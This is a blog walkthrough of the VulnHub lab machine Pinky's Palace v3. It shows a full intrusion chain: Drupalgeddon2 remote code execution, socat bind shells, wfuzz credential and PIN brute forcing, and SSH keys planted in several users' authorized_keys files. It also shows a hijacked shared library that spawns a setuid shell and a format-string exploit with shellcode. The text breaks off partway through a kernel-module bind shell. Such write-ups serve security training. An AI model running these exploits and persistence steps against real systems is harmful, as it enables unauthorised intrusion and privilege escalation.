---
title: VulnHub - Pinky's Palace v3
author: ret2x
date: 2023-03-21 16:22:00 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, bof, rce]
image:
    path: /assets/images/pinkysv3/front.png
---

**Description:** A linux machine that involves to exploit a drupal version vulnerable to Remote Code Execution. A web application running locally as well misconfigurations and vulnerable binaries were abused to elevate the access level and gain root privileges.

**Author:** Pink_Panther

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/pinkys-palace-v3,237/](https://www.vulnhub.com/entry/pinkys-palace-v3,237/)


## Information Gathering
### Host Discovery

Check if the provided machine is reachable, since it shows us the IP address once the machine is turned on.

```console
root@kali:~/pinkyspv3# ping -c 3 172.16.178.140
PING 172.16.178.140 (172.16.178.140) 56(84) bytes of data.
64 bytes from 172.16.178.140: icmp_seq=1 ttl=64 time=0.709 ms
64 bytes from 172.16.178.140: icmp_seq=2 ttl=64 time=0.746 ms
64 bytes from 172.16.178.140: icmp_seq=3 ttl=64 time=0.678 ms

--- 172.16.178.140 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 0.678/0.711/0.746/0.027 ms
```

### Port Scanning

The full TCP port scan discovered three available ports.

```console
root@kali:~/pinkyspv3# nmap -n -v --min-rate 500 -p- -Pn 172.16.178.140 -oG nmap/port-scan.txt
...
PORT     STATE SERVICE
21/tcp   open  ftp
5555/tcp open  freeciv
8000/tcp open  http-alt
```

### Service Enumeration

Script scanning and version detection revealed that anonymous login is enabled on port 21 FTP, an SSH version on an arbitrary port 5555, and drupal 7 running on port 8000.

```console
root@kali:~/pinkyspv3# nmap -n -v -sC -sV -p21,5555,8000 -Pn 172.16.178.140 -oN nmap/service-enum.txt 
...
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.16.178.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             173 May 14  2018 WELCOME
5555/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 80:52:6e:bd:b0:c4:be:0a:f2:1d:3b:ac:b8:47:4f:ee (RSA)
|   256 eb:c8:76:a4:cf:37:6f:0d:5f:f5:48:af:5c:29:92:d9 (ECDSA)
|_  256 48:2b:84:02:3e:87:7b:2a:f3:91:11:31:0f:98:11:c7 (ED25519)
8000/tcp open  http    nginx 1.10.3
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: PinkDrup
|_http-generator: Drupal 7 (http://drupal.org)
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3
```

### Web Application Enumeration

Using the browser was verified that drupal version 7 is available on port 8000.

![](/assets/images/pinkysv3/screenshot-1.png)

![](/assets/images/pinkysv3/screenshot-2.png)

Also its current version can be checked in the **CHANGELOG.txt** file.

```console
root@kali:~/pinkyspv3# curl -s http://172.16.178.140:8000/CHANGELOG.txt | head -n 2

Drupal 7.57, 2018-02-21
```

## Exploitation
### Exploiting Drupal 7.57 - Drupalgeddon2

Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600).

An unauthenticated Remote Code Execution vulnerability was discovered and exploited in drupal version 7.57. I have developed a python exploit based on the  following [reference](https://ine.com/blog/cve-2018-7600-drupalgeddon-2).

Note that the firewall rules block the outgoing traffic, so the written script is based on a technique called forward shell, if you want to learn about how to work forward shells click [here](https://www.youtube.com/watch?v=-ST2FSbqEcU).

Download the script [here](https://github.com/ret2x-tools/drupalgeddon2-rce.git), and execute it.

```console
root@kali:~/pinkyspv3/scripts# python3 poc.py http://172.16.178.140:8000
(Cmd) whoami
www-data
(Cmd) upgrade
www-data@pinkys-palace:~/html$ 
```

When you type the upgrade command, a full interactive shell is spawned, bypassing the firewall restrictions.

Other way is through a bind shell. On the target machine type the following commands to check that socat is installed and to start a socat bind shell on port 9999.

```console
(Cmd) whereis socat
socat: /usr/bin/socat /usr/share/man/man1/socat.1.gz

(Cmd) socat TCP4-LISTEN:9999,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

On the attacker machine type the following commands to connect to the bind shell on port 9999 and obtain a full interactive shell.

If you want to learn how socat bind shell works click [here](https://wind010.hashnode.dev/bind-and-reverse-shells#heading-socat), and how to set an encrypted communication through socat click [here](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/).

```console
root@kali:~/pinkyspv3# socat FILE:`tty`,raw,echo=0 TCP:172.16.178.140:9999
www-data@pinkys-palace:~/html$ export TERM=screen
www-data@pinkys-palace:~/html$ stty rows 42 columns 165
www-data@pinkys-palace:~/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Listing the local services on port 80 and 65334 two unknown services were detected.

```console
www-data@pinkys-palace:~/html$ ss -antl
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      80     127.0.0.1:3306                     *:*                  
LISTEN     0      128    127.0.0.1:80                       *:*                  
LISTEN     0      128          *:5555                     *:*                  
LISTEN     0      128    127.0.0.1:65334                    *:*                  
LISTEN     0      128          *:8000                     *:*                  
LISTEN     0      128         :::80                      :::*                  
LISTEN     0      128         :::5555                    :::*                  
LISTEN     0      32          :::21                      :::*
```

Enumerating the apache configurations, the documentroot that belonging to a web application was found in pinksec's home.

```console
www-data@pinkys-palace:/$ grep -ir 'documentroot' /etc/apache2
/etc/apache2/sites-available/000-default.conf:	DocumentRoot /home/pinksec/html
/etc/apache2/sites-available/000-default.conf:	DocumentRoot /home/pinksec/database
/etc/apache2/sites-available/default-ssl.conf:		DocumentRoot /var/www/html
```

The apache process is running as user **pinksec**, it is concluded that the web app and database are running as that user.

```console
www-data@pinkys-palace:~/html$ ps auxwe | grep pinksec
pinksec    652  0.0  2.1 139576 10748 ?        S    06:26   0:00 /usr/sbin/apache2 -k start
...
```

**Port Forwarding**

In the first command all TCP traffic on port 1234 will be redirected to 127.0.0.1 on port 80. The idea is the same for the second command, all TCP traffic on port 1235 will be redirected to 127.0.0.1 on port 65334. 

If you want to know more about socat you can check the link [here](https://www.hackingarticles.in/socat-for-pentester/).

```console
www-data@pinkys-palace:/var/mail$ socat TCP-LISTEN:1234,fork,reuseaddr tcp:127.0.0.1:80 &

www-data@pinkys-palace:/var/mail$ socat TCP-LISTEN:1235,fork,reuseaddr tcp:127.0.0.1:65334 &
```

Enumerating the web application running locally on port 80 through port 1234 allowed to know a login form.

![](/assets/images/pinkysv3/screenshot-3.png)

An unsuccessful attempt to discover a way to gain access to the web application allowed me to switch the focus and enumerate the local service on port 65334.

![](/assets/images/pinkysv3/screenshot-4.png)

Enumerating for several days vaily, a sqlmap wordlist containing the common tables allowed me to identify the **pwds.db** file containing the possible passwords.

```console
root@kali:~/pinkyspv3# gobuster dir -u http://172.16.178.140:1235 -w /usr/share/sqlmap/data/txt/common-tables.txt -e -x sql,db,txt
...
http://172.16.178.140:1235/pwds.db              (Status: 200) [Size: 221]
```

![](/assets/images/pinkysv3/screenshot-5.png)

The pwds.db file was downloaded to the attacker machine.

```console
root@kali:~/pinkyspv3# wget --no-verbose http://172.16.178.140:1235/pwds.db
```

Was proceeded to list the system users, drupal database connection and its credentials to create a list of usernames.

```console
www-data@pinkys-palace:~/html$ grep 'sh$' /etc/passwd 
root:x:0:0:root:/root:/bin/bash
pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
pinksec:x:1001:1001::/home/pinksec:/bin/bash
pinksecmanagement:x:1002:1002::/home/pinksecmanagement:/bin/bash
```

Listing drupal database connection.

```console
www-data@pinkys-palace:~/html$ cat cat /var/www/html/sites/default/settings.php
...
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'dpink',
      'password' => 'drupink',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
...
```

Retrieving drupal credentials.

```console
www-data@pinkys-palace:~/html$ mysql -u dpink -D drupal -p
Enter password:
MariaDB [drupal]> select name,pass from users;
+-----------+---------------------------------------------------------+
| name      | pass                                                    |
+-----------+---------------------------------------------------------+
|           |                                                         |
| pinkadmin | $S$DDLlBhU7uSuGiPBv1gqEL1QDM1G2Nf3SQOXQ6TT7zsAE3IBZAgup |
+-----------+---------------------------------------------------------+
2 rows in set (0.01 sec)
```

Creating the list of users.

```console
root@kali:~/pinkyspv3# echo "pinky 
dquote> pinksec
dquote> pinksecmanagement"
dquote> dpink"
dquote> pinkadmin" > users.txt 
```

Once created the list of usernames and passwords in the web application form, intercept the request entering some values to the form. 

![](/assets/images/pinkysv3/screenshot-6.png)

With the data intercepted from the form request, was built the following instruction to perform a dictionary attack.

Note that the response by the server side with incorrect creds is at 45 chars, so create the wfuzz command as follows.

```console
root@kali:~/pinkyspv3# wfuzz -c --hh 45 -z file,users.txt -z file,pwds.db -d "user=FUZZ&pass=FUZ2Z&pin=12345" http://172.16.178.140:1234/login.php
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                  
=====================================================================

000000086:   200        0 L      6 W        41 Ch       "pinkadmin - AaPinkSecaAdmin4467"
```

In the output above there is a response by the server side with 41 chars, it is an indicative that these are the possible credentials, but the pin is unknown at this unknown.

Look at the small changes in the response by the server in relation with the previous response when the credentials were incorrect.

![](/assets/images/pinkysv3/screenshot-7.png)

Already known the possible credentials, it is time to brute force to find the valid pin.

```console
root@kali:~/pinkyspv3# wfuzz -c --hh 41 -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt -d "user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ" http://172.16.178.140:1234/login.php 
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================

000055850:   302        0 L      0 W        0 Ch        "55849" 
```

In the output above note that there is a redirection status code, it indicates that the correct pin was found.

Log in to the web application. This redirects to a management console that allows running system commands.

![](/assets/images/pinkysv3/screenshot-8.png)

![](/assets/images/pinkysv3/screenshot-9.png)

As the SSH service is available, the ideal will be to generate a ssh key pair to log in and gain direct access to the server.

The following command generates a ssh key pair.

```console
root@kali:~/pinkyspv3# ssh-keygen -P "pinksecdoor#" -f rsa
```

The following command creates the **.ssh** directory and in this saves the public key into the **authorized_keys** file.

```console
mkdir /home/pinksec/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIJqT3DW116t2UPtjG6BDZLUm4bfuHDvWRkmqQbtiIFnoOkTNIvIOVJ5Fju8z/PEqYibtJ0FVfDldbLAGCl7HbkdqEQuXjbY7wC6g+qMn2wYCxEq/cyUCiydxDAkwf4THT3QzBqk0vFX9r1BflMdCUYMSLFmPkEoFBooG7jBxeUdI7VFpdZ0qcCjVvFPAmZjkI6iAk+UHtdVFY42Skw8/MnCVfqwdQ+ZVWXiuxe778blGyPs0GLsy60nBmkMjq5CTo6wQ4XPvZ7EhVV7+Pgozp902RcTdMn0HckRZPfTBjhtNT+i6NMzqQBgBXDFxRmEWgB46eMWBdpJ0AYl+/gryplPIURKlMVtKhCH2PNgWGqo5/bSgAdjwZPCLwHGM7kEfRJsiSIYfu1JDDEdWiC8AVi7QyZWWV6yjBjKGGmvBaOPQVjTlNcdZZCzkscPgrlYS1RMsiPPUemwuM7jkfVQyMwdVqCzBBaLxbFIAy5PZbX8ktCiHp//45eGatAQmCIZs=" > /home/pinksec/.ssh/authorized_keys
```

![](/assets/images/pinkysv3/screenshot-10.png)

On the attacker machine grants read and write permissions to the owner, and log in to the server via SSH.

```console
root@kali:~/pinkyspv3# chmod 600 rsa

root@kali:~/pinkyspv3# ssh pinksec@172.16.178.140 -p 5555 -i rsa
Enter passphrase for key 'rsa': 
Linux pinkys-palace 4.9.0-6-686 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
pinksec@pinkys-palace:~$ id
uid=1001(pinksec) gid=1001(pinksec) groups=1001(pinksec)
```

Listing the SUID binaries an uncommon binary file was found, the same one that is placed in a directory inside pinksec's home.

```console
pinksec@pinkys-palace:~$ find / -perm -u=s -type f 2>/dev/null 
...
/home/pinksec/bin/pinksecd
...

pinksec@pinkys-palace:~$ ls -la /home/pinksec/bin/pinksecd
-rwsr-xr-x 1 pinksecmanagement pinksecmanagement 7508 May 13  2018 /home/pinksec/bin/pinksecd
```

Checking the binary with **ldd** it is confirmed that the **libpinksec** library is needed by the binary. Note that this library has granted writable permissions to all users.

```console
pinksec@pinkys-palace:~$ ldd /home/pinksec/bin/pinksecd 
	linux-gate.so.1 (0xb7fd9000)
	libpinksec.so => /lib/libpinksec.so (0xb7fc8000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e11000)
	/lib/ld-linux.so.2 (0xb7fdb000)
pinksec@pinkys-palace:~$ ls -la /lib/libpinksec.so
-rwxrwxrwx 1 root root 7136 May 14  2018 /lib/libpinksec.so
```

Tranfer the binary and the library to the attacker machine.

```console
root@kali:~/pinkyspv3# scp -P 5555 -i rsa pinksec@172.16.178.140:bin/pinksecd .
Enter passphrase for key 'rsa':
pinksecd                                                100% 7508   443.8KB/s   00:00    

root@kali:~/pinkyspv3# scp -P 5555 -i rsa pinksec@172.16.178.140:/lib/libpinksec.so .
Enter passphrase for key 'rsa': 
libpinksec.so                                           100% 7136     1.0MB/s   00:00 
```

By executing and run the binary with **ltrace** without the needed library, the program shows an error.

```console
root@kali:~/pinkyspv3# ./pinksecd 
./pinksecd: error while loading shared libraries: libpinksec.so: cannot open shared object file: No such file or directory

root@kali:~/pinkyspv3# ltrace ./pinksecd 
./pinksecd: error while loading shared libraries: libpinksec.so: cannot open shared object file: No such file or directory
+++ exited (status 127) +++
```

Copy the **libpinksec.so** library to the **/lib** directory for the program work.

```console
root@kali:~/pinkyspv3# cp libpinksec.so /lib 
                                                                                                                                                                     
root@kali:~/pinkyspv3# ./pinksecd           
[+] PinkSec Daemon [+]
Options: -d: daemonize, -h: help
Soon to be host of pinksec web application.
```

To analyze the binary I used ghidra. By default ghidra is not installed on kali linux, you can install it with the following commands.

```console
root@kali:~/pinkyspv3# apt update 
                                                                                                                                                                     
root@kali:~/pinkyspv3# apt install ghidra -y 
```

Open a terminal, type ghidra and press enter.

Click on **File**, select **New Project** then will pup up a new window, select **Next**, choose the **Project Directory**, type the **Project Name** and click **Finish**.

Click on **File**, select **Import File**, choose the binary to analyze and click **Select File To Import**, then will be show a new window click **Ok** and in the information window click **Ok**.

Drop down the binary file to the dragon icon to analyze it, to the next dialogal window click **Yes** and to the next window click **Analyze**.


Once opened the **pinksecd** binary, note that this binary calls some functions. the first one is **psbanner()**.

![](/assets/images/pinkysv3/screenshot-11.png)


The functions that is calling the **pinksecd** binary are in the library **libpinksec.so**. A way to escalate is through a technique called shared library misconfigurations.

![](/assets/images/pinkysv3/screenshot-12.png)

## Privilege Escalation
### Exploiting Shared Library Misconfigurations

In this case the malicious library is created containing the function that is called by the binary, as is posible to overwrite the library due to the writable permissions to all the users, a reference about this topic you can found it [here](https://tbhaxor.com/exploiting-shared-library-misconfigurations/).

Since **gcc** is installed, it helps to save a few aditional steps.

```console
pinksec@pinkys-palace:~$ which gcc
/usr/bin/gcc
```

The following C program executes a shell, the same one that will be executed by the **pinksecd** binary.

```c
#include <stdlib.h>
#include <unistd.h>

int psbanner(){
	setuid(0);
	setgid(0);
	system("/bin/sh");
}

int main(){
	psbanner();
	return 0;
}
```

Compile the C program as a shared library and place it in the **/lib** directory. Then execute the **pinksecd** binary to elevate the privileges as user **pinksecmanagement**.

```console
pinksec@pinkys-palace:~$ gcc -shared -fPIC -o /lib/libpinksec.so libpinksec.c 
pinksec@pinkys-palace:~$ /home/pinksec/bin/pinksecd
$ whoami
pinksecmanagement
$ id
uid=1001(pinksec) gid=1001(pinksec) euid=1002(pinksecmanagement) groups=1001(pinksec)
```

Enumerating the SUID binaries, reveals another unusual program, and when interacting with it, you need to belong to the **pinksecmanagement** group, since in the current shell instance it is not possible.

```console
$ find / -perm -u=s -type f 2>/dev/null
...
/usr/local/bin/PSMCCLI
...

$ ls -la /usr/local/bin/PSMCCLI
-rwsrwx--- 1 pinky pinksecmanagement 7396 May 14  2018 /usr/local/bin/PSMCCLI

$ /usr/local/bin/PSMCCLI
/bin/sh: 6: /usr/local/bin/PSMCCLI: Permission denied
```

I used the SSH public key created previously, in pinksecmanagement's home directory was created the **.ssh** directory and inside it the **authorized_keys** file with the public key.

```console
$ cd /home/pinksecmanagement
$ mkdir .ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIJqT3DW116t2UPtjG6BDZLUm4bfuHDvWRkmqQbtiIFnoOkTNIvIOVJ5Fju8z/PEqYibtJ0FVfDldbLAGCl7HbkdqEQuXjbY7wC6g+qMn2wYCxEq/cyUCiydxDAkwf4THT3QzBqk0vFX9r1BflMdCUYMSLFmPkEoFBooG7jBxeUdI7VFpdZ0qcCjVvFPAmZjkI6iAk+UHtdVFY42Skw8/MnCVfqwdQ+ZVWXiuxe778blGyPs0GLsy60nBmkMjq5CTo6wQ4XPvZ7EhVV7+Pgozp902RcTdMn0HckRZPfTBjhtNT+i6NMzqQBgBXDFxRmEWgB46eMWBdpJ0AYl+/gryplPIURKlMVtKhCH2PNgWGqo5/bSgAdjwZPCLwHGM7kEfRJsiSIYfu1JDDEdWiC8AVi7QyZWWV6yjBjKGGmvBaOPQVjTlNcdZZCzkscPgrlYS1RMsiPPUemwuM7jkfVQyMwdVqCzBBaLxbFIAy5PZbX8ktCiHp//45eGatAQmCIZs=' > .ssh/authorized_keys
```

Accessing through ssh as **pinksecmanagement** user.

```console
root@kali:~/pinkyspv3# ssh pinksecmanagement@172.16.178.140 -p 5555 -i rsa
Enter passphrase for key 'rsa': 
Linux pinkys-palace 4.9.0-6-686 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
pinksecmanagement@pinkys-palace:~$ id                                                                                                                               
uid=1002(pinksecmanagement) gid=1002(pinksecmanagement) groups=1002(pinksecmanagement)
pinksecmanagement@pinkys-palace:~$ whoami
pinksecmanagement
```

Execute the SUID binary, note that with the **ldd** command the programm not requires of a custom library as the previous case.

```console
pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI
[+] Pink Sec Management Console CLI
pinksecmanagement@pinkys-palace:~$ ldd /usr/local/bin/PSMCCLI
	linux-gate.so.1 (0xb7fd9000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e17000)
	/lib/ld-linux.so.2 (0xb7fdb000)
```

Transfer to the attacker machine the **PSMCCLI** binary.

```console
root@kali:~/pinkyspv3# scp -P 5555 -i rsa pinksecmanagement@172.16.178.140:/usr/local/bin/PSMCCLI .
Enter passphrase for key 'rsa': 
PSMCCLI                                                               100% 7396     1.0MB/s   00:00
```

Open the **PSMCCLI** binary with ghidra and when analyzing it notice that the user input is not referenced with its corresponding format string. This bad practice converts the binary in vulnerable.

![](/assets/images/pinkysv3/screenshot-13.png)

![](/assets/images/pinkysv3/screenshot-14.png)

### Exploiting format string vulnerability

A format string vulnerability happens when a programmer has passed a user controlled input as part of the first argument of a call to one of the printf family of functions. References on how to exploit this issue you can find them here:

[Plain Format String Vulnerability](https://exploit.ph/x86-32-linux/2014/05/20/plain-format-string-vulnerability/index.html)

[printf Format String Exploitation](https://systemoverlord.com/2014/02/12/printf-format-string-exploitation/).

By entering **%x** as parameter the vulnerability was checked, so it prints hexadecimal values from the stack.

```console
pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI %x
[+] Args: bffff744
```

Then, there is to define an environment variable (this variable can be named as you want), which contains the shellcode. The 21-byte shellcode was obtained from [here](https://shell-storm.org/shellcode/files/shellcode-841.html).

```console
pinksecmanagement@pinkys-palace:~$ export SHELLCODE=$(printf "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")
```

To find the memory address of the SHELLCODE environment variable the following C script was used, which was downloaded from [here](https://github.com/historypeats/getenvaddr/blob/master/getenvaddr.c).

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
	char *ptr;

	if (argc < 3) {
		printf("Usage: %s <environment var> <target program name>\n", argv[0]);
		exit(0);
	} else {
		ptr = getenv(argv[1]); /* Get environment variable location */
		ptr += (strlen(argv[0]) - strlen(argv[2])) * 2; /* Adjust for program name */
		printf("%s will be at %p\n", argv[1], ptr);
	}
}
```

Compile and run the c program, it extracts the memory address of the SHELLCODE variable. The idea is to redirect the program execution flow to address **0xbffffe6f**, and thus get a shell.

```console
pinksecmanagement@pinkys-palace:~$ gcc getenvaddr.c -o getenvaddr
pinksecmanagement@pinkys-palace:~$ ./getenvaddr SHELLCODE /usr/local/bin/PSMCCLI 
SHELLCODE will be at 0xbffffe6f
```

The following bash one-liner found the four A's passed as arguments on the stack at position 137. Note that it was necessary to add two B's as padding to complete the reading of the four A's (41 in hex).

```console
pinksecmanagement@pinkys-palace:~$ for i in $(seq 1 200); do echo -n "$i " && /usr/local/bin/PSMCCLI "AAAABB%$i\$x"; done | grep '41414141'
137 [+] Args: AAAABB41414141
```

The following command verifies that the system architecture accepts the little endian format.

```console
pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI "1234BB%137\$x"
[+] Args: 1234BB34333231
```

Having found the base position, this makes it easy to control the additional address that is needed (in total 8 bytes), to which four C's and four D's were added as padding, as shown below:

```console
pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI "AAAABBBBCCCCDDDD%137\$x%138\$x"
[+] Args: AAAABBBBCCCCDDDD4141414142424242
```

In the previous analysis with ghidra, it was noted that there is a call to **putchar** after the vulnerable **printf** instruction in the **argshow** function, the following commands checks it.

```console
root@kali:~/pinkyspv3# gdb -q ./PSMCCLI 
Reading symbols from ./PSMCCLI...
(No debugging symbols found in ./PSMCCLI)
(gdb) disas argshow
Dump of assembler code for function argshow:
   0x0804849b <+0>:     push   %ebp
   0x0804849c <+1>:     mov    %esp,%ebp
   0x0804849e <+3>:     push   %ebx
   0x0804849f <+4>:  	sub    $0x4,%esp
   0x080484a2 <+7>: 	call   0x80483d0 <__x86.get_pc_thunk.bx>
   0x080484a7 <+12>:	add    $0x1b59,%ebx
   0x080484ad <+18>:	sub    $0xc,%esp
   0x080484b0 <+21>:	lea    -0x1a30(%ebx),%eax
   0x080484b6 <+27>:	push   %eax
   0x080484b7 <+28>:	call   0x8048340 <printf@plt>
   0x080484bc <+33>:	add    $0x10,%esp
   0x080484bf <+36>:	sub    $0xc,%esp
   0x080484c2 <+39>:	push   0x8(%ebp)
   0x080484c5 <+42>:	call   0x8048340 <printf@plt>
   0x080484ca <+47>:	add    $0x10,%esp
   0x080484cd <+50>:	sub    $0xc,%esp
   0x080484d0 <+53>:	push   $0xa
   0x080484d2 <+55>:	call   0x8048380 <putchar@plt>
   0x080484d7 <+60>:	add    $0x10,%esp
   0x080484da <+63>:	sub    $0xc,%esp
   0x080484dd <+66>:	push   $0x0
   0x080484df <+68>:	call   0x8048360 <exit@plt>
End of assembler dump.
(gdb)
```

The following command was used to prints the dynamic relocation entries of a file, which allowed to figure out where **putchar** address is in memory.

```console
pinksecmanagement@pinkys-palace:~$ objdump -R /usr/local/bin/PSMCCLI 

/usr/local/bin/PSMCCLI:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ffc R_386_GLOB_DAT    __gmon_start__
0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   exit@GLIBC_2.0
0804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   putchar@GLIBC_2.0
```

So there is to overwrite the memory location pointing to **putchar** with the address of the environment variable.

The **putchar** address must be defined as follows:

To the lowest address `0804a01c`

To the highest address `0804a01c + 2 = 0804a01e`

Remember that the address have to be written in little endian.

```console
pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CCCCDDDD%137\$x%138\$x
[+] ArgsCCCCDDDD804a01c804a01e
```

The shellcode address `0xbffffe6f` as is very large number, must be splited into two short words, to the lower address `0xfe6f` and to the higher address `0xbfff`.

To write the first value, there is to take the address `0xfe6f` whose equivalent in decimal is **65135** minus **16** (the number of characters used to control the position of the two directions). 

```console
pinksecmanagement@pinkys-palace:~$ echo $((0xfe6f))
65135
pinksecmanagement@pinkys-palace:~$ echo $((65135 - 16))
65119
```

Note that **%n** is used to write values to memory locations, **%u** to specify an unsigned decimal value, and **%hn** to write two bytes at a time. The first part of the payload is:

```console
pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CCCCDDDD%65119u%137\$hn%138\$hn
```

To write the second value, since `0xbfff` is lower than `0xfe6f`, you need to do the calculation as follows:

```console
pinksecmanagement@pinkys-palace:~$ echo $((0x1bfff - 0xfe6f))
49552
```

The final payload is:

```console
pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CCCCDDDD%65119u%137\$hn%49552u%138\$hn

$ whoami
pinky
```

It not only works by overwriting the memory location pointing to **putchar**, another way is to overwrite the memory location that points to **exit**, just perform small changes to the final payload, as shown below:

```console
pinksecmanagement@pinkys-palace:~$ objdump -R /usr/local/bin/PSMCCLI | grep 'exit'
0804a014 R_386_JUMP_SLOT   exit@GLIBC_2.0
```

```console
pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI $(printf "\x14\xa0\x04\x08\x16\xa0\x04\x08")CCCCDDDD%65119u%137\$hn%49552u%138\$hn
                                                                                                                                       0
$ whoami
pinky
``` 

Save the generated public key in the pinky's home directory.

```console
$ mkdir /home/pinky/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIJqT3DW116t2UPtjG6BDZLUm4bfuHDvWRkmqQbtiIFnoOkTNIvIOVJ5Fju8z/PEqYibtJ0FVfDldbLAGCl7HbkdqEQuXjbY7wC6g+qMn2wYCxEq/cyUCiydxDAkwf4THT3QzBqk0vFX9r1BflMdCUYMSLFmPkEoFBooG7jBxeUdI7VFpdZ0qcCjVvFPAmZjkI6iAk+UHtdVFY42Skw8/MnCVfqwdQ+ZVWXiuxe778blGyPs0GLsy60nBmkMjq5CTo6wQ4XPvZ7EhVV7+Pgozp902RcTdMn0HckRZPfTBjhtNT+i6NMzqQBgBXDFxRmEWgB46eMWBdpJ0AYl+/gryplPIURKlMVtKhCH2PNgWGqo5/bSgAdjwZPCLwHGM7kEfRJsiSIYfu1JDDEdWiC8AVi7QyZWWV6yjBjKGGmvBaOPQVjTlNcdZZCzkscPgrlYS1RMsiPPUemwuM7jkfVQyMwdVqCzBBaLxbFIAy5PZbX8ktCiHp//45eGatAQmCIZs=" > /home/pinky/.ssh/authorized_keys
```

Accessing via ssh as user **pinky**.

```console
root@kali:~/pinkyspv3# ssh pinky@172.16.178.140 -p 5555 -i rsa
Enter passphrase for key 'rsa':
pinky@pinkys-palace:~$ whoami
pinky
```

### Sudo Permissions

When listing the sudo permissions the following commands were detected, which are used to interact with kernel modules.

```console
pinky@pinkys-palace:~$ sudo -l
Matching Defaults entries for pinky on pinkys-palace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pinky may run the following commands on pinkys-palace:
    (ALL) NOPASSWD: /sbin/insmod
    (ALL) NOPASSWD: /sbin/rmmod
```

The **insmod** command is used to insert mudules into the kernel, and the **rmmod** command is used to remove a module from the kernel.

A kernel module was created to execute a bind shell, and the Makefile to compile it. For more information on creating modules, and a good introduction about linux rootkits, click [here](https://xcellerator.github.io/posts/linux_rootkits_01/).

```c
#include <linux/kmod.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM bind shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","socat TCP4-LISTEN:1337,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

